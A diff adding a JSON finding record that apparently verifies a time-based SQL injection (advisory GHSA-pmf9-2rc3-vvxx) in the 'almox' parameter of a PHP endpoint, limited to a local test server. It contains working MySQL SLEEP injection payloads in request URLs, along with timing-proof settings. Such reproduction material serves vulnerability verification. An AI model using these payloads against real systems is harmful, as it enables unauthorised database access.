@@ -1,0 +1,38 @@
+{
+  "finding_id": "GHSA-pmf9-2rc3-vvxx",
+  "type": "sqli.time_based",
+  "target": {
+    "expected_origin": "http://127.0.0.1:8989",
+    "allowed_hosts": ["127.0.0.1"],
+    "allowed_schemes": ["http"],
+    "allowed_ports": [8989]
+  },
+  "auth": {
+    "required": false
+  },
+  "evidence": {
+    "requests": {
+      "control": {
+        "method": "GET",
+        "url": "http://127.0.0.1:8989/controle/getProdutosPorAlmox.php?almox=1"
+      },
+      "delay_low": {
+        "method": "GET",
+        "url": "http://127.0.0.1:8989/controle/getProdutosPorAlmox.php?almox=0%20OR%20%28SELECT%201%20FROM%20%28SELECT%20SLEEP%280%29%29x%29"
+      },
+      "delay_high": {
+        "method": "GET",
+        "url": "http://127.0.0.1:8989/controle/getProdutosPorAlmox.php?almox=0%20OR%20%28SELECT%201%20FROM%20%28SELECT%20SLEEP%285%29%29x%29"
+      }
+    },
+    "vulnerable_parameter": "almox",
+    "dbms_hint": "mysql"
+  },
+  "proof": {
+    "repetitions": 4,
+    "randomize_order": true,
+    "min_median_delta_ms": 3500,
+    "require_body_similarity": true,
+    "timeout_ms": 12000
+  }
+}
